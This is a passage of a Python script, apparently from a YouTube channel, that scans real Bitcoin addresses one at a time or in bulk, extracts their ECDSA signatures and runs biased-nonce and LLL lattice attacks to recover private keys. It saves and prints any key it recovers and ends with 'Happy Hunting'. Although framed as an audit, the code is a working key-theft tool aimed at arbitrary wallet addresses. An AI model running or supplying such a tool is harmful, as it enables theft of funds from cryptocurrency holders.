                "engine": "ECDSA_FORENSIC_PRO",
                "timestamp": int(time.time())
            }, f_json, indent=4)
    except Exception:
        pass

    # ── SIGNATURES.csv  (auto-built for run_attack.py) CRYPTOGRAPHYTUBE ───────────────────────
    sig_csv_path = os.path.join(group_dir, "SIGNATURES.csv")
    try:
        if _LLL_AVAILABLE:
            rsz_list = [(s['r'], s['s'], s['z']) for s in all_sigs]
            csv_rows = _lll_module.val2_from_rsz(rsz_list)
            with open(sig_csv_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(csv_rows))
            sig_csv_ok = True
        else:
            sig_csv_ok = False
    except Exception:
        sig_csv_ok = False

    print(f"    => Saved: {group_dir}/")
    files = "vuln_info.txt | per_tx_vuln_detail.txt | vulnerable_data.txt | hnp_lattice.txt"
    if merge.get('found'):
        files += " | multi_depth_merge.txt"
    if recon.get('status') == 'DONE':
        files += " | k_reconstruction.txt"
    if sage_path:
        files += " | lattice_attack.sage"
    if sig_csv_ok:
        files += " | SIGNATURES.csv"

    # ── {address}.txt  (manual input file for lll.py) CRYPTOGRAPHYTUBE ────────────────────────
    lll_input_path = f"{address}.txt"
    try:
        all_sigs_for_lll = grp.get('_sigs', sigs)
        with open(lll_input_path, 'w', encoding='utf-8') as f:
            f.write(f"# LLL Attack Input File\n")
            f.write(f"# Address : {address}\n")
            f.write(f"# PubKey  : {pubkey}\n")
            if grp.get('recovered_d'):
                f.write(f"# RECOVERED_KEY: {hex(grp['recovered_d'])}\n")
            f.write(f"# Sigs    : {len(all_sigs_for_lll)}\n")
            f.write(f"# Format  : r,s,z  (hex values, one per line)\n")
            f.write(f"# Usage   : python3 lll.py  then enter '{address}.txt'\n")
            f.write("# " + "=" * 60 + "\n")
            for sig in all_sigs_for_lll:
                f.write(f"{hex(sig['r'])},{hex(sig['s'])},{hex(sig['z'])}\n")
        files += f" | {lll_input_path}"
        print(f"    [+] LLL input file saved: {lll_input_path}")
        print(f"        Run: python3 lll.py  → enter file: {lll_input_path}")
    except Exception as e:
        print(f"    [!] Could not save {lll_input_path}: {e}")

    print(f"       {files}")

    # ── Master Summary Update (New Feature) CRYPTOGRAPHYTUBE ──────────────────────────────────
    summary_path = os.path.join("results", "addressinfisummmry.txt")
    try:
        os.makedirs("results", exist_ok=True)
        write_header = not os.path.exists(summary_path)
        with open(summary_path, 'a', encoding='utf-8') as f_sum:
            if write_header:
                f_sum.write("ADDRESS".ljust(40) + " | VERDICT".ljust(18) + " | SIGS".ljust(8) + " | TYPE".ljust(10) + " | BITS".ljust(8) + " | RECON\n")
                f_sum.write("-" * 105 + "\n")
            
            leak_type = "NONE"
            bits = 0
            if best_lsb:
                leak_type = "LSB"
                bits = best_lsb['b']
            elif best_msb:
                leak_type = "MSB"
                bits = best_msb['b']
            
            rs = recon.get('verdict', 'N/A')
            f_sum.write(f"{address:40} | {grp['verdict']:15} | {grp['n_sigs']:5d} | {leak_type:8} | {bits:5d} | {rs}\n")
    except Exception:
        pass



# ═══════════════════════════════════════════════════════════════════════════
#  ADDRESS AUDIT CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def color(text, code): return f"\033[{code}m{text}\033[0m"
RED   = 91; GREEN = 92; YELLOW = 93; CYAN = 96; BOLD = 1


def print_group_result(grp: dict):
    v = grp['verdict']
    s = grp['score']
    pk_short = grp['pubkey'][:32] + "..."
    n = grp['n_sigs']
    
    # Verdict Styling
    if   v == 'VULNERABLE': 
        vstr = color(f" ★ VULNERABLE ★ (Score: {s}/100)", RED)
        border = RED
    elif v == 'SUSPICIOUS': 
        vstr = color(f" SUSPICIOUS (Score: {s}/100)", YELLOW)
        border = YELLOW
    else:                   
        vstr = color(f" CLEAN (Score: {s}/100)", GREEN)
        border = GREEN

    print(f"\n    ╔{'═'*72}╗")
    print(f"    ║ PUBKEY: {pk_short:48} ║")
    print(f"    ║ SIGS  : {n:<10}  VERDICT: {vstr:44}║")
    print(f"    ╠{'═'*72}╣")

    # Show Bit-Lifting Depth (Deep Level Check)
    if grp.get('lsb_results'):
        best = grp.get('best_lsb')
        if best and best['signal'] != 'NONE':
            depth = best['b']
            # Visual bit-lift bar
            bar = "▰" * (depth // 2) + "▱" * (16 - depth // 2)
            print(f"    ║ {color('DEEP BIAS SCAN:', 94)} Depth={depth:2d} bits [{bar}] Success={best['consistency']:.0%}  ║")
            print(f"    ║ {color('PARTIAL KEY  :', 94)} d mod 2^{depth:2d} = {hex(best['d_partial'])} (verified)   ║")
            print(f"    ║ {color('NONCE MODEL  :', 94)} k mod 2^{depth:2d} = {hex(best['k_lsb'])} (fixed offset) ║")
            print(f"    ╠{'─'*72}╣")

    if grp.get('recovered_d'):
        d_hex = hex(grp['recovered_d'])
        print(f"    ║ {color('★★★ PRIVATE KEY RECOVERED! ★★★', f'{RED};{BOLD}'):72} ║")
        print(f"    ║ Key (HEX): {d_hex:59} ║")
        print(f"    ╠{'─'*72}╣")

    # Detailed Flags
    for flag in grp['flags']:
        icon = "⚡" if "TIER-1" in flag else "⚑"
        print(f"    ║ {icon} {flag[:66]:66} ║")

    if not grp['flags']:
        print(f"    ║ No leakage signals detected in entropy profile.                    ║")
    print(f"    ╚{'═'*72}╝")


def audit_address(address: str, limit: int):
    global TOTAL_SCANNED, TOTAL_FOUND
    TOTAL_SCANNED += 1

    print(f"\n{'─'*68}")
    print(f"  Auditing: {color(address, CYAN)}")
    print(f"{'─'*68}")

    meta     = smart_fetch(f"/address/{address}")
    tx_count = meta.get('chain_stats', {}).get('tx_count', 0) if meta else 0
    to_fetch = min(limit, tx_count) if tx_count > 0 else limit

    # ── Show TX summary before fetching ──────────────────────────────────
    print(f"    - Total TX on-chain     : {color(str(tx_count), CYAN)}")
    print(f"    - TX to fetch (limit)   : {color(str(to_fetch), YELLOW)}")

    sigs    = []
    last_id = None
    fetched = 0
    total_processed = 0

    while total_processed < to_fetch:
        path = f"/address/{address}/txs"
        if last_id: path += f"/chain/{last_id}"

        txs = smart_fetch(path)
        if not txs or not isinstance(txs, list): break
        
        # Update last_id BEFORE processing, to ensure we always move forward
        last_id = txs[-1].get('txid')
        if not last_id: break

        for tx in txs:
            total_processed += 1
            for i, vin in enumerate(tx.get('vin', [])):
                po = vin.get('prevout') or {}
                if po.get('scriptpubkey_address') != address: continue
                r, s, pub = extract_rs_pub(vin)
                if not (r and s): continue
                is_segwit = bool(vin.get('witness'))
                z = get_z_p2wpkh(tx, i) if is_segwit else get_z_p2pkh(tx, i)
                if z:
                    sigs.append({'txid': tx['txid'], 'r': r, 's': s, 'z': z, 'pub': pub})
                    fetched += 1
            
            # Progress Display (No Glitch)
            bar_done = int(25 * min(total_processed, to_fetch) / max(to_fetch, 1))
            bar = "█" * bar_done + "░" * (25 - bar_done)
            sys.stdout.write(f"    - [{bar}] {total_processed}/{to_fetch} | Sigs: {fetched} | Last: {tx['txid'][:10]}... \r")
            sys.stdout.flush()

            if total_processed >= to_fetch: break

        if len(txs) < 25: break 
        time.sleep(0.2)

    print(" " * 80, end='\r')
    print(f"    - Fetched               : {color(str(fetched), CYAN)} / {color(str(tx_count), CYAN)} TX")
    print(f"    - Signatures extracted  : {color(str(len(sigs)), BOLD)}")

    if len(sigs) < 1:
        print(f"    - {color('No signatures found for analysis.', YELLOW)}")
        return False

    # ── Group by pubkey, analyze each group IMMEDIATELY CRYPTOGRAPHYTUBE ──────────────────
    groups        = group_by_pubkey(sigs)
    print(f"    - Unique pubkeys found  : {color(str(len(groups)), CYAN)}")
    print(f"    - Min sigs for analysis : {MIN_GROUP_SIGS}\n")

    # Save ALL signatures to a master LLL file for the address (User Request)
    # This ensures lll.py has the full dataset even if some are marked 'CLEAN'
    try:
        # We use a dummy group object for the master file
        master_grp = {'pubkey': 'MULTI-KEY-MASTER', 'recovered_d': None}
        save_lll_input(address, sigs, master_grp)
    except: pass

    found_this = False
    for pubkey, group_sigs in groups.items():
        if len(group_sigs) < MIN_GROUP_SIGS:
            continue
        
        # Analyze THIS group now
        grp = analyze_group(pubkey, group_sigs, address)
        print_group_result(grp)

        # 1. Save results to disk immediately
        save_lll_input(address, group_sigs, grp)
        save_group_results(address, grp)
        if grp.get('recovered_d'):
            save_private_key_special(address, grp['recovered_d'])
            found_this = True
        print(f"    {color('=> Analysis Results Saved.', GREEN)}")

    # ── 2. Trigger MASTER LLL Attack ALWAYS (Unified Audit for the whole address) ───────────
    # This runs regardless of CLEAN/VULNERABLE status to ensure no hidden bias is missed.
    # Uses the master {address}.txt data which contains ALL fetched transactions.
    print(f"\n    [LLL] {color('Starting Master Lattice Audit for full address dataset...', CYAN)}")
    try:
        master_dir = os.path.join("results", address, "master_attack")
        os.makedirs(master_dir, exist_ok=True)
        
        # Use ALL extracted signatures for the address (Master List)
        lll_keys = try_lll_attack(address, sigs, master_dir)
        if lll_keys:
            recovered_d = lll_keys[0]
            save_private_key_special(address, recovered_d)
            print(color(f"\n    *** MASTER LLL SUCCESS: PRIVATE KEY RECOVERED! ***", f"{RED};{BOLD}"))
            found_this = True
        else:
            print(f"    [LLL] {color('No keys found in master audit.', YELLOW)}")
    except Exception as e:
        print(f"    [!] Master LLL Attack skipped or failed: {e}")

    return found_this


# ═══════════════════════════════════════════════════════════════════════════
#  CHECKPOINT CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def save_checkpoint(i: int):
    with open("checkpoint.txt", "w") as f:
        f.write(str(i))


def load_checkpoint() -> int:
    if os.path.exists("checkpoint.txt"):
        with open("checkpoint.txt") as f:
            return int(f.read().strip())
    return 0


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

BANNER = """
╔══════════════════════════════════════════════════════════════════════╗
║  HNP/CVP  |  Biased-Nonce LSB Leakage — BIT Detector               ║
║  Methods: Entropy Analysis · Chi-Square Test · HNP Lattice Prep    ║
║                                                                      ║
║  Channel : CRYPTOGRAPHYTUBE                                          ║
║  Author  : sisujhon                                                  ║
╚══════════════════════════════════════════════════════════════════════╝
"""


def main():
    print(BANNER)
    limit = int(input("[?] Max TX to fetch per address (default 200): ").strip() or "200")
    mode  = input("[?] Mode — [1] Single address  [2] Bulk from btc.txt : ").strip()
    start_time = time.time()

    if mode == "1":
        addr = input("[?] Bitcoin address: ").strip()
        audit_address(addr, limit)

    elif mode == "2":
        if not os.path.exists("btc.txt"):
            print("[!] btc.txt not found.")
            sys.exit(1)
        with open("btc.txt") as f:
            addrs = [ln.strip() for ln in f if ln.strip()]
        start = load_checkpoint()
        print(f"[*] Resuming from checkpoint #{start}  ({len(addrs) - start} remaining)")
        for i in range(start, len(addrs)):
            audit_address(addrs[i], limit)
            save_checkpoint(i + 1)
    else:
        print("[!] Invalid mode.")

    elapsed = round(time.time() - start_time, 2)
    print(f"""
{'═'*68}
  FINAL REPORT
  Addresses scanned : {TOTAL_SCANNED}
  Flagged (vuln/suspicious) : {TOTAL_FOUND}
  Time elapsed      : {elapsed}s
{'═'*68}
""")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{color('!!! USER INTERRUPT DETECTED !!!', 91)}")
        print(f"[*] Stopping audit and exiting gracefully...")
        print(f"[*] {color('Goodbye! Happy Hunting.', 92)}\n")
        sys.exit(0)
